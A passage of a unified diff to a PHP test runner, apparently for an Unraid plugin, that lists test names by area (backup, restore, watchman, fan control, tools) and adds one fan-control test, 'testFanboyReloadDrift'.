'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testLogsWakes', 'testLogsWakeTrail', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanOwnCron', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupTruthShares', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereVmMigratable', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereProtectionTruth', 'testWhereCronTruth', 'testWhereMoverAdvice', 'testSpace', 'testWhereMap', 'testCleanupSizesUnknown', 'testArrayStoppedDataDir', 'testWhereBuilding', 'testCleanupTick', 'testCleanupJobCap', 'testCleanupJobSameResult', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testHireNeeds', 'testMovedDesk', 'testMigrateJackId', 'testMigrateMediaCache', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testLookOldRun', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testFlashDownload', 'testWatchmanApiDoor', 'testCaretakerApi', 'testCaretakerNetworks', 'testSetupMessages', 'testDriftCodes', 'testIconStacks', 'testPartnerPairing', 'testPartnerUsonetSimple', 'testPartnerAddress', 'testPartnerWatch', 'testPartnerGone', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testBackupPairsReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testCleanEnv', 'testPlgInstall', 'testWatchmanRoundWait', 'testPlgRemove', 'testBackupLetGo', 'testBackupAbortAsked', 'testJackSetupFresh', 'testApiGetOffline', 'testSupporterList', 'testReportDialogImages', 'testReportDialogDiagnostics',
                       'testRestoreReviewPaths', 'testRestoreSharesTick', 'testBackupSharesTick', 'testRestoreGapsPage', 'testRestoreGapsAgent', 'testRestoreGapsSwap', 'testRestoreShareUnlisted', 'testRestoreGapsLibvirt', 'testRestoreReviewJob', 'testRestoreReviewForeign', 'testRestoreReviewPeek',
                       'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanBootNoise', 'testWatchmanAtOnce', 'testWatchmanAtTold', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testJackThemes', 'testSnapPoolSplit', 'testTruthRestPages', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testPlaceReadersNoSettings', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testSkipPlaces', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages', 'testScheduleTile', 'testTourSchedules', 'testUsoNetPin', 'testUsoNetRule', 'testUsoNetStatus', 'testFanboyLook'],
@@ -66295,7 +66508,7 @@ $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlan
           'fanboy' => ['testFanboyPublic', 'testCaretakerNewcomers', 'testFanboyNoWrite', 'testFanboyDetect', 'testFanboySituations', 'testFanboyIdentity', 'testFanboyReport', 'testFanboyHints', 'testFanboyPage',
                        'testFanboyWrite', 'testFanboyControl', 'testFanboyAlarms', 'testFanboyChipMissing', 'testFanboyBoards', 'testFanboySteps', 'testFanboyZones',
                        'testFanboyProcesses', 'testFanboyDrivers', 'testFanboyStopScripts', 'testFanboyState',
-                       'testFanboyBack', 'testFanboyGuardCron', 'testFanboyWaz', 'testFanboyHistoryPart', 'testFanboyMeasureProgress', 'testFanboyFanLook', 'testFanboyDesk', 'testFanboyUx', 'testFanboyOverview', 'testFanboyHistoryLeads', 'testFanboyDeskWords', 'testFanboyHistoryThin', 'testFanboyAvatar', 'testFanboyCount', 'testFanboyHottestKinds', 'testFanboyRound3Words', 'testFanboyStandsKick', 'testFanboyNvmeWarm', 'testFanboyProposeKinds', 'testFanboyReact', 'testFanboyTemps', 'testFanboyCpuOwn', 'testFanboyPresetsMirror', 'testFanboyR5Subjects', 'testFanboyR5GuardZone', 'testFanboyR5TrimHeld', 'testFanboyR5Names', 'testFanboyR5ChipGone', 'testFanboyR5Moved', 'testFanboyR5NoDriftAtFull', 'testFanboyR5Obeys', 'testFanboyR5GiveBackSafe', 'testFanboyR5Sane', 'testFanboyR5Refused', 'testFanboyR5Detect', 'testFanboyR5DisksAsleep', 'testFanboyR5TwoChips', 'testFanboyR6WatchLearn', 'testFanboyR6WatchRules', 'testFanboyR6WarmNow', 'testFanboyR6ShowStep', 'testFanboyR6ShowRefused', 'testFanboyR6ShowControl', 'testFanboyR6OldDisks', 'testFanboyR7FullOnObeys', 'testFanboyR7ControlFullOn', 'testFanboyR7Fixed', 'testFanboyR7NotAController', 'testFanboyR7CardsKeepSize', 'testFanboyR7TestLongEnough', 'testFanboyR8IgnoredLate', 'testFanboyR8FullLongEnough', 'testFanboyR8Quiet', 'testFanboyR8QuietGuards', 'testFanboyR8QuietSafety', 'testFanboyR8FoundNext', 'testFanboyR8Assign', 'testFanboyR9Kick', 'testFanboyR9Safety', 'testFanboyR9Now', 'testFanboyR9CpuOwn', 'testFanboyR10Notify', 'testFanboyR11Heard', 'testFanboyR11StopVerdict', 'testFanboyR11StaleNext', 'testFanboyR11ProgressNext', 'testFanboyR12Standstill', 'testFanboyR12Warm', 'testFanboyR12Control', 'testFanboyR12CpuRole', 'testFanboyR12CpuMeasure', 'testFanboyR12CpuControl', 'testFanboyR12CpuGone', 'testFanboyR12FixSpikes', 'testFanboyR12FixControl', 'testFanboyR12FixConfirm', 'testFanboyNetDrift', 'testFanboyNet', 'testFanboyNetTakeOver', 'testFanboyR12Curve', 'testFanboyR12CurveEffective', 'testFanboyR12AutoSeen', 'testFanboyR12Look', 'testFanboyR13Compat', 'testFanboyR13Curves', 'testFanboyR13Refused', 'testFanboyR13Devs', 'testFanboyR13DevsControl', 'testFanboyR14Plan', 'testFanboyR14Look', 'testFanboySetupFanPlan', 'testFanboyDashHours', 'testFanboyTimes', 'testFanboySsdSleeps', 'testFanboyCpuFloorCurve',
+                       'testFanboyBack', 'testFanboyGuardCron', 'testFanboyWaz', 'testFanboyHistoryPart', 'testFanboyMeasureProgress', 'testFanboyFanLook', 'testFanboyDesk', 'testFanboyUx', 'testFanboyOverview', 'testFanboyHistoryLeads', 'testFanboyDeskWords', 'testFanboyHistoryThin', 'testFanboyAvatar', 'testFanboyCount', 'testFanboyHottestKinds', 'testFanboyRound3Words', 'testFanboyStandsKick', 'testFanboyNvmeWarm', 'testFanboyProposeKinds', 'testFanboyReact', 'testFanboyTemps', 'testFanboyCpuOwn', 'testFanboyPresetsMirror', 'testFanboyR5Subjects', 'testFanboyR5GuardZone', 'testFanboyR5TrimHeld', 'testFanboyR5Names', 'testFanboyR5ChipGone', 'testFanboyR5Moved', 'testFanboyR5NoDriftAtFull', 'testFanboyR5Obeys', 'testFanboyR5GiveBackSafe', 'testFanboyR5Sane', 'testFanboyR5Refused', 'testFanboyR5Detect', 'testFanboyR5DisksAsleep', 'testFanboyR5TwoChips', 'testFanboyR6WatchLearn', 'testFanboyR6WatchRules', 'testFanboyR6WarmNow', 'testFanboyR6ShowStep', 'testFanboyR6ShowRefused', 'testFanboyR6ShowControl', 'testFanboyR6OldDisks', 'testFanboyR7FullOnObeys', 'testFanboyR7ControlFullOn', 'testFanboyR7Fixed', 'testFanboyR7NotAController', 'testFanboyR7CardsKeepSize', 'testFanboyR7TestLongEnough', 'testFanboyR8IgnoredLate', 'testFanboyR8FullLongEnough', 'testFanboyR8Quiet', 'testFanboyR8QuietGuards', 'testFanboyR8QuietSafety', 'testFanboyR8FoundNext', 'testFanboyR8Assign', 'testFanboyR9Kick', 'testFanboyR9Safety', 'testFanboyR9Now', 'testFanboyR9CpuOwn', 'testFanboyR10Notify', 'testFanboyR11Heard', 'testFanboyR11StopVerdict', 'testFanboyR11StaleNext', 'testFanboyR11ProgressNext', 'testFanboyR12Standstill', 'testFanboyR12Warm', 'testFanboyR12Control', 'testFanboyR12CpuRole', 'testFanboyR12CpuMeasure', 'testFanboyR12CpuControl', 'testFanboyR12CpuGone', 'testFanboyR12FixSpikes', 'testFanboyR12FixControl', 'testFanboyR12FixConfirm', 'testFanboyNetDrift', 'testFanboyReloadDrift', 'testFanboyNet', 'testFanboyNetTakeOver', 'testFanboyR12Curve', 'testFanboyR12CurveEffective', 'testFanboyR12AutoSeen', 'testFanboyR12Look', 'testFanboyR13Compat', 'testFanboyR13Curves', 'testFanboyR13Refused', 'testFanboyR13Devs', 'testFanboyR13DevsControl', 'testFanboyR14Plan', 'testFanboyR14Look', 'testFanboySetupFanPlan', 'testFanboyDashHours', 'testFanboyTimes', 'testFanboySsdSleeps', 'testFanboyCpuFloorCurve',
                        'testFanboyDashTile', 'testFanboyDashSource', 'testFanboyDashSetting', 'testFanboyDashHistory', 'testFanboyDashFans'],
           'tools' => ['testReleaseHashes', 'testReleaseState', 'testReleaseClicksRetry', 'testScenarioToolsSafe']];
 // php tests/run.php [<part>|<test> …] — no name: everything; else every named part and test, each once, in the order of
